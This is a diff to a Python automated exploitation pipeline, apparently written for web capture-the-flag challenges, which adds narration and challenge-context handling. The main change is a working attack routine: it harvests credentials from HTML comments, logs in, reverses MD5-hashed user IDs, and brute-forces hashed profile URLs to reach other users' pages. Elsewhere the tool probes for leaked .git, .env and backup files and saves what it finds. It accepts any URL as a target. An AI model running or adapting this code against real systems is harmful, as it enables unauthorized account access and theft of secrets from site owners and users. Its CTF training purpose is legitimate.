@@ -45,6 +45,8 @@ from modules.nosql_injection import NoSQLInjectionEngine
 from modules.reasoning_engine import ReasoningEngine
 from modules.intelligence_engine import IntelligenceEngine
 from modules.ctf_reasoner import CTFReasoner
+from modules.thinking_engine import ThinkingEngine
+from modules.narrator_engine import NarratorEngine
 
 
 
@@ -57,12 +59,41 @@ class AutoPwnPipeline:
         self.target_url = target_url.strip()
         self.step_by_step = step_by_step
         self.flag_prefix = custom_flag_prefix
+        
+        # Interactive prompts for challenge context
+        print("\n--- Challenge Context (Optional) ---")
+        self.challenge_name = input("Challenge Name: ").strip()
+        self.challenge_desc = input("Challenge Description: ").strip()
+        self.challenge_hints = input("Challenge Hints: ").strip()
+        if not self.flag_prefix:
+            self.flag_prefix = input("Flag Format (e.g. picoCTF{): ").strip()
+        print("------------------------------------\n")
+
         self.session = create_session()
         self.learning_engine = LearningEngine()
+        self.narrator = NarratorEngine()
+        
+        # Analyze Context using Thinking Engine
+        self.thinking_engine = ThinkingEngine()
+        context_data = {
+            "name": self.challenge_name,
+            "desc": self.challenge_desc,
+            "hints": self.challenge_hints
+        }
+        self.thinking_profile = self.thinking_engine.analyze(context_data)
+
+        # Use auto-extracted flag format if user didn't provide one
+        if not self.flag_prefix and self.thinking_profile.get("extracted_flag_format"):
+            self.flag_prefix = self.thinking_profile["extracted_flag_format"]
+            print(f"[*] Thinking Engine auto-extracted flag format: {self.flag_prefix}")
         
         # State tracking across all 7 phases
         self.state = {
             "target_url": self.target_url,
+            "challenge_name": self.challenge_name,
+            "challenge_desc": self.challenge_desc,
+            "challenge_hints": self.challenge_hints,
+            "thinking_profile": self.thinking_profile,
             "tech_stack": [],
             "endpoints": set(),
             "forms": [],
@@ -94,7 +125,6 @@ class AutoPwnPipeline:
         self.state["attack_steps"].append(step_entry)
         if curl_cmd:
             self.state["curl_commands"].append(curl_cmd)
-
     def _check_and_store_flags(self, text: str, source_context: str = ""):
         """Scan text for CTF flags, print victory panel, and store in state.
         Returns True if at least one new flag was captured."""
@@ -104,7 +134,14 @@ class AutoPwnPipeline:
             for f in set(found):
                 if f not in self.state["captured_flags"]:
                     self.state["captured_flags"].add(f)
-                    print_flag(f)
+                    
+                    # Use NarratorEngine for interactive flag check
+                    needs_escalation = self.narrator.interactive_flag_check(f)
+                    if needs_escalation:
+                        self.step_by_step = True
+                        self.narrator.speak_action("Activating ChainingEngine for advanced escalation paths...")
+                        self.state["thinking_profile"]["specific_clues"].append("ESCALATION REQUIRED: User confirmed more flags exist. Must chain vulnerabilities to reach inner network or root.")
+                        
                     self._log_step("Phase 7: Flag Capture", f"Captured flag from {source_context}: {f}")
                     captured_any = True
         return captured_any
@@ -194,10 +231,16 @@ class AutoPwnPipeline:
     # PHASE 1: جمع المعلومات والاستطلاع (Information Gathering & Reconnaissance)
     # =========================================================================
     def phase1_reconnaissance(self):
-        print_header("المرحلة 1: جمع المعلومات والاستطلاع", "Phase 1: Deep Recon & Asset Scraping")
+        self.narrator.speak_phase_intro(
+            "Phase 1: Information Gathering & Reconnaissance",
+            "Let's map out the attack surface. I'll scrape links, check hidden forms, and see what technologies we're dealing with."
+        )
+        self.narrator.speak_action("Initializing deep reconnaissance and asset scraping...")
         
         # 1. Fetch Root Page
         try:
+            self.narrator.speak_thinking(f"I should grab the root page first to set a baseline: {self.target_url}")
+            self.narrator.speak_recon(f"Fetching root page: {self.target_url}")
             r = self.session.get(self.target_url, timeout=15)
             self.state["endpoints"].add(self.target_url)
             self.state["baseline_html"] = r.text
@@ -213,11 +256,11 @@ class AutoPwnPipeline:
             for cname, cval in cookies_dict.items():
                 if cval.count(".") == 2:
                     self.state["jwt_tokens"].append((cname, cval))
-                    print_info(f"Detected JWT Token in cookie '[bold cyan]{cname}[/bold cyan]'")
+                    self.narrator.speak_success(f"Detected JWT Token in cookie '{cname}'")
 
             # Tech fingerprinting
             self.state["tech_stack"] = fingerprint_tech(headers_dict, r.text, cookies_dict)
-            print_success(f"Fingerprinted Technologies: {', '.join(self.state['tech_stack']) or 'Standard Web'}")
+            self.narrator.speak_recon(f"Fingerprinted Technologies: {', '.join(self.state['tech_stack']) or 'Standard Web'}")
 
             # 2. Extract HTML Comments & Inline Secrets
             comments = re.findall(r"<!--(.*?)-->", r.text, re.DOTALL)
@@ -227,7 +270,7 @@ class AutoPwnPipeline:
                     self.state["comments"].append(c_clean)
                     self._check_and_store_flags(c_clean, "HTML Comment")
             if self.state["comments"]:
-                print_info(f"Extracted {len(self.state['comments'])} HTML Comments.")
+                self.narrator.speak_recon(f"Extracted {len(self.state['comments'])} HTML Comments.")
 
             # 3. Deep Link & Form Parsing
             parsed = extract_forms_and_links(r.text, self.target_url)
@@ -247,23 +290,37 @@ class AutoPwnPipeline:
                 self.state["parameters"].add(p)
 
             print_info(f"Discovered [bold green]{len(self.state['endpoints'])}[/bold green] Endpoints, [bold green]{len(self.state['forms'])}[/bold green] Forms, [bold green]{len(self.state['scripts'])}[/bold green] Scripts, [bold green]{len(self.state['parameters'])}[/bold green] Input Parameters.")
-
             # 4. Dummy Data Harvest (Form Interaction)
             self._harvest_form_cookies()
 
-        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
-            print_error(f"Failed to connect to target URL: {e}")
-            return
+            # 4. Fetch robots.txt
+            robots_url = urljoin(self.target_url, "robots.txt")
+            r_robots = self.session.get(robots_url, timeout=10)
+            if r_robots.status_code == 200:
+                self.narrator.speak_success(f"Discovered robots.txt")
+                self._check_and_store_flags(r_robots.text, "robots.txt")
+                for line in r_robots.text.split('\n'):
+                    if "Disallow" in line or "Allow" in line:
+                        path = line.split(":")[-1].strip()
+                        if path and path != "/":
+                            self.state["endpoints"].add(urljoin(self.target_url, path))
+                            self.narrator.speak_recon(f"Added robots.txt path: {path}")
 
+            self.narrator.speak_success(
+                f"Recon Complete: {len(self.state['endpoints'])} URLs, {len(self.state['forms'])} Forms, {len(self.state['parameters'])} Parameters."
+            )
+
+        except Exception as e:
+            self.narrator.speak_warning(f"Reconnaissance encountered an error: {e}")
 
         # 4. Probe CTF Sensitive Paths (.git, .env, backups, etc.)
-        print_info("Probing CTF source leaks (.git, .env, backups, Dockerfile)...")
+        self.narrator.speak_recon("Probing CTF source leaks (.git, .env, backups, Dockerfile)...")
         hits = scan_target(self.target_url, max_workers=8, flag_prefix=self.flag_prefix)
         self.state["sensitive_hits"] = hits
         
         for h in hits:
             if h["status"] == 200:
-                print_success(f"Sensitive Asset Found: [bold yellow]{h['path']}[/bold yellow] (Size: {h['length']} bytes)")
+                self.narrator.speak_success(f"Sensitive Asset Found: {h['path']} (Size: {h['length']} bytes)")
                 self._log_step("Phase 1: Recon", f"Discovered sensitive file: {h['path']}", curl_cmd=f"curl -s {h['url']}")
                 # If .env or config file leaked, save to loot
                 if any(x in h["path"] for x in [".env", "config", "app.py", "backup", "flag"]):
@@ -284,7 +341,7 @@ class AutoPwnPipeline:
         if not forms:
             return
 
-        print_info(f"Initiating Dummy Data Harvest on {len(forms)} forms to uncover hidden state/cookies...")
+        self.narrator.speak_recon(f"Initiating Dummy Data Harvest on {len(forms)} forms to uncover hidden state/cookies...")
         for f in forms:
             action = f.get("action", self.target_url)
             method = f.get("method", "GET").upper()
@@ -334,15 +391,19 @@ class AutoPwnPipeline:
     # PHASE 2: الفحص والتحليل الإحصائي (Scanning & Statistical Analysis)
     # =========================================================================
     def phase2_statistical_analysis(self):
-        print_header("المرحلة 2: الفحص والتحليل الإحصائي", "Phase 2: Statistical & Response Profiling")
+        self.narrator.speak_phase_intro(
+            "Phase 2: Statistical & Response Profiling",
+            "I'm going to measure baseline responses, check parameter reflections, and peek inside any tokens I found."
+        )
         
         # 1. Baseline Response Measurement & Semantic Diagnostic Check
         try:
             t0 = time.time()
+            self.narrator.speak_thinking("Measuring latency and payload size on the root endpoint...")
             base_resp = self.session.get(self.target_url, timeout=15)
             base_time = time.time() - t0
             base_len = len(base_resp.content)
-            print_info(f"Baseline Profile: Status {base_resp.status_code} | Length: {base_len} bytes | Latency: {base_time:.2f}s")
+            self.narrator.speak_recon(f"Baseline Profile: Status {base_resp.status_code} | Length: {base_len} bytes | Latency: {base_time:.2f}s")
             
             # Semantic response diagnostic
             diag = ResponseAnalyzer.analyze_response(base_resp.text, base_resp.status_code, dict(base_resp.headers))
@@ -376,16 +437,20 @@ class AutoPwnPipeline:
 
         # 3. JWT Inspection
         for cname, token in self.state["jwt_tokens"]:
+            self.narrator.speak_thinking(f"Attempting to decode JWT found in '{cname}' cookie...")
             decoded = decode_jwt(token)
             if decoded:
-                print_info(f"JWT Header: {decoded.get('header')} | Claims: {decoded.get('payload')}")
+                self.narrator.speak_success(f"JWT Header: {decoded.get('header')} | Claims: {decoded.get('payload')}")
                 self._log_step("Phase 2: Analysis", f"JWT token inspected on cookie {cname}")
 
     # =========================================================================
     # PHASE 3: تحليل الثغرات والنمذجة (Vulnerability Analysis & Threat Modeling)
     # =========================================================================
     def phase3_threat_modeling(self):
-        print_header("المرحلة 3: تحليل الثغرات والنمذجة", "Phase 3: Attack Surface & Threat Modeling")
+        self.narrator.speak_phase_intro(
+            "Phase 3: Attack Surface & Threat Modeling",
+            "Let's combine everything we've seen into a structured attack map. I'll ask the Reasoning Engine to prioritize the most likely flaws."
+        )
         
         attack_surface = []
         
@@ -458,7 +523,7 @@ class AutoPwnPipeline:
         # This engine UNDERSTANDS the application's logic instead of
         # blindly firing static payloads. It analyzes cookies, headers,
         # and behavior to form testable theories about the challenge.
-        print_info("Running CTF Logical Reasoner (human-like analysis)...")
+        self.narrator.speak_thinking("Running CTF Logical Reasoner. I'm going to form theories like a human pentester...")
         try:
             self.ctf_reasoner = CTFReasoner(self.target_url, session=self.session, state=self.state)
             reasoner_report = self.ctf_reasoner.reason()
@@ -477,7 +542,7 @@ class AutoPwnPipeline:
                     details="; ".join(c["evidence"][:2])
                 )
         except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
-            print_warning(f"CTF Logical Reasoner encountered an issue: {e}")
+            self.narrator.speak_warning(f"CTF Logical Reasoner encountered an issue: {e}")
 
         # ── Predictive Vulnerability Ranking (Phase 3b) ─────────────────
         # Use all recon evidence to predict the most likely vuln classes
@@ -487,7 +552,7 @@ class AutoPwnPipeline:
         # ── Intelligence Engine (Phase 3c) ──────────────────────────────
         # The "brain" that evaluates all findings, scores their importance,
         # filters out noise, and builds a prioritized attack order.
-        print_info("Running Intelligence Engine to prioritize findings and filter noise...")
+        self.narrator.speak_thinking("Feeding data into the Intelligence Engine to filter noise and prioritize targets...")
         try:
             self.intelligence = IntelligenceEngine(self.state, self.learning_engine)
             intelligence_report = self.intelligence.analyze()
@@ -517,7 +582,7 @@ class AutoPwnPipeline:
                     details=", ".join(e["endpoint"] for e in intelligence_report["ignore_list"][:5])
                 )
         except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
-            print_warning(f"Intelligence engine encountered an issue: {e}")
+            self.narrator.speak_warning(f"Intelligence engine encountered an issue: {e}")
             self.intelligence = None
 
     # =========================================================================
@@ -530,7 +595,7 @@ class AutoPwnPipeline:
         of (vuln_class, confidence, evidence) and stores it in state so that
         Phase 4 can prioritize the most promising exploit vectors first.
         """
-        print_info("Predicting likely vulnerability classes from recon evidence...")
+        self.narrator.speak_recon("Predicting likely vulnerability classes from recon evidence...")
         predictions = []  # list of (vuln_class, confidence, evidence)
 
         html = self.state.get("baseline_html", "")
@@ -733,14 +798,17 @@ class AutoPwnPipeline:
             for vc, (conf, ev) in ranked[:3]:
                 self._log_step("Phase 3b: Prediction", f"Predicted {vc} ({conf*100:.0f}%) - {ev}")
         else:
-            print_info("No strong vulnerability predictions from recon evidence.")
+            self.narrator.speak_thinking("No strong vulnerability predictions derived from recon evidence.")
 
     # =========================================================================
     # PHASE 4: الاستغلال الفعلي (Active Exploitation)
     # =========================================================================
 
     def phase4_active_exploitation(self):
-        print_header("المرحلة 4: الاستغلال الفعلي", "Phase 4: Active Multi-Vector Exploitation")
+        self.narrator.speak_phase_intro(
+            "Phase 4: Active Multi-Vector Exploitation",
+            "Time to break things! I'll focus on the vulnerabilities I predicted and shoot payloads."
+        )
 
         # ── Predictive prioritization ────────────────────────────────────
         # Run the exploit vectors that were predicted as most likely FIRST,
@@ -748,7 +816,7 @@ class AutoPwnPipeline:
         predictions = self.state.get("predictions", [])
         predicted_classes = {p["vuln_class"] for p in predictions}
         if predicted_classes:
-            print_info(f"Prioritizing predicted vectors: {', '.join(sorted(predicted_classes))}")
+            self.narrator.speak_action(f"Prioritizing predicted vectors based on reconnaissance: {', '.join(sorted(predicted_classes))}")
 
         # Map vuln_class -> exploit method
         exploit_map = {
@@ -1328,54 +1396,104 @@ class AutoPwnPipeline:
         """
         Exploit predictable MD5-hashed user IDs (like picoCTF Hashgate).
         The app hashes a numeric user ID with MD5 and uses it as an identifier.
-        Brute-force IDs in a range (e.g. 3000-3020) and try each MD5 hash.
+        Steps:
+          1. Extract guest credentials from HTML comments (e.g. <!-- Email: guest@picoctf.org Password: guest -->)
+          2. Login with guest credentials to get the base user ID (e.g. 3000)
+          3. Brute-force IDs in a range (e.g. 3000-3020) and try each MD5 hash
+          4. Access /profile/user/<md5_hash> to find the admin flag
         """
         import hashlib as _hashlib
         print_info("Exploiting MD5-Hashed ID Brute-Force (Hashgate-style)...")
         success = False
 
-        # Detect the ID parameter from the current URL or discovered params
-        params = list(self.state.get("parameters", []))
-        id_params = [p for p in params if any(k in p.lower() for k in ["id", "user", "uid", "account", "profile"])]
-        if not id_params:
-            id_params = ["id"]
+        # ── Step 1: Extract guest credentials from HTML comments ─────────
+        # Pattern: <!-- Email: xxx Password: yyy --> or <!-- email: xxx pass: yyy -->
+        guest_creds = None
+        html = self.state.get("baseline_html", "")
+        if not html:
+            try:
+                r = self.session.get(self.target_url, timeout=8)
+                html = r.text
+            except Exception:
+                pass
+        if html:
+            m = re.search(
+                r'<!--\s*(?:email|user|username|login)\s*:\s*([^\s<]+)\s*(?:password|pass|pwd)\s*:\s*([^\s<]+)\s*-->',
+                html, re.IGNORECASE)
+            if m:
+                guest_creds = (m.group(1), m.group(2))
+                print_info(f"  Found guest credentials in HTML comment: {guest_creds[0]} / {guest_creds[1]}")
 
-        # Determine the ID range to brute-force.
-        # Hashgate uses IDs 3000-3020 (20 employees). We'll try a broad range.
-        # If we can detect a base ID from the current URL, start from there.
+        # ── Step 2: Login with guest credentials ─────────────────────────
         base_id = 3000
-        # Try to extract a numeric ID from the current URL
-        import re as _re
-        m = _re.search(r'[?&]id=(\d+)', self.target_url)
-        if m:
-            base_id = int(m.group(1))
-        # Range: base_id to base_id+30 (covers ~20-30 employees)
+        if guest_creds:
+            email, password = guest_creds
+            for form in self.state.get("forms", []):
+                action = form.get("action", self.target_url)
+                method = form.get("method", "POST").upper()
+                inputs = [i.get("name", "") for i in form.get("inputs", [])]
+                email_field = next((n for n in inputs if any(k in n.lower() for k in ["email", "user", "username", "login"])), None)
+                pass_field = next((n for n in inputs if any(k in n.lower() for k in ["pass", "pwd"])), None)
+                if not email_field or not pass_field:
+                    continue
+                try:
+                    data = {email_field: email, pass_field: password}
+                    if method == "POST":
+                        r = self.session.post(action, data=data, timeout=8, allow_redirects=True)
+                    else:
+                        r = self.session.get(action, params=data, timeout=8, allow_redirects=True)
+                    # Check if login succeeded and extract the base ID from the redirect URL
+                    # e.g. /profile/user/e93028bdc1aacdfb3687181f2031765d
+                    final_url = r.url
+                    m = re.search(r'/profile/user/([a-f0-9]{32})', final_url, re.IGNORECASE)
+                    if m:
+                        # Reverse the MD5 hash to find the base ID
+                        for i in range(2990, 3030):
+                            if _hashlib.md5(str(i).encode()).hexdigest() == m.group(1).lower():
+                                base_id = i
+                                print_info(f"  Guest login succeeded! Base user ID: {base_id}")
+                                break
+                    print_info(f"  Login response URL: {final_url}")
+                except Exception:
+                    pass
+
+        # ── Step 3: Brute-force the ID range ─────────────────────────────
+        # Hashgate uses IDs 3000-3020 (20 employees). We'll try a broad range.
         id_range = range(base_id, base_id + 31)
 
-        # Build candidate URLs: base URL + endpoints with id param
-        candidate_urls = [self.target_url]
+        # Build candidate URLs:
+        # 1. /profile/user/<md5_hash> (Hashgate format)
+        # 2. Base URL + endpoints with id param
+        candidate_urls = []
+        # Always try /profile/user/<hash> format
+        profile_base = urljoin(self.target_url, "/profile/user/")
+        candidate_urls.append(("profile", profile_base))
+        # Also try /user/<hash> and /profile/<hash>
+        candidate_urls.append(("user", urljoin(self.target_url, "/user/")))
+        candidate_urls.append(("profile", urljoin(self.target_url, "/profile/")))
+        # Also try query param format
         for ep in self.state.get("endpoints", []):
             if any(k in ep.lower() for k in ["user", "profile", "account", "dashboard", "home"]):
-                candidate_urls.append(urljoin(self.target_url, ep))
+                candidate_urls.append(("param", urljoin(self.target_url, ep)))
 
-        for url in candidate_urls:
+        for url_type, url in candidate_urls:
             for uid in id_range:
                 # Generate MD5 hash of the numeric ID
                 md5_hash = _hashlib.md5(str(uid).encode()).hexdigest()
                 try:
-                    # Try the raw numeric ID first
-                    r = self.session.get(url, params={id_params[0]: str(uid)}, timeout=5)
-                    if self._check_and_store_flags(r.text, f"MD5 ID BF (id={uid}) against {url}"):
-                        print_success(f"  Flag captured with raw ID '{uid}' on {url}!")
-                        return True
-                    # Try the MD5 hash as the ID value
-                    r = self.session.get(url, params={id_params[0]: md5_hash}, timeout=5)
-                    if self._check_and_store_flags(r.text, f"MD5 ID BF (id={md5_hash}) against {url}"):
-                        print_success(f"  Flag captured with MD5 hash '{md5_hash}' (ID {uid}) on {url}!")
+                    if url_type == "profile" or url_type == "user":
+                        # Path-based: /profile/user/<md5_hash>
+                        full_url = url + md5_hash
+                        r = self.session.get(full_url, timeout=5)
+                    else:
+                        # Query param: ?id=<md5_hash>
+                        r = self.session.get(url, params={"id": md5_hash}, timeout=5)
+                    if self._check_and_store_flags(r.text, f"MD5 ID BF (ID {uid}, hash {md5_hash}) against {full_url if url_type != 'param' else url}"):
+                        print_success(f"  Flag captured with MD5 hash '{md5_hash}' (ID {uid})!")
                         return True
                     # Also check for flag patterns in the response
-                    if _re.search(r'(picoCTF\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}|FLAG\{[^}]+\})', r.text, _re.IGNORECASE):
-                        print_success(f"  [MD5 ID BF] Flag pattern found for ID {uid} (hash {md5_hash}) on {url}!")
+                    if re.search(r'(picoCTF\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}|FLAG\{[^}]+\})', r.text, re.IGNORECASE):
+                        print_success(f"  [MD5 ID BF] Flag pattern found for ID {uid} (hash {md5_hash})!")
                         self._check_and_store_flags(r.text, f"MD5 ID BF success (ID {uid})")
                         return True
                 except Exception:
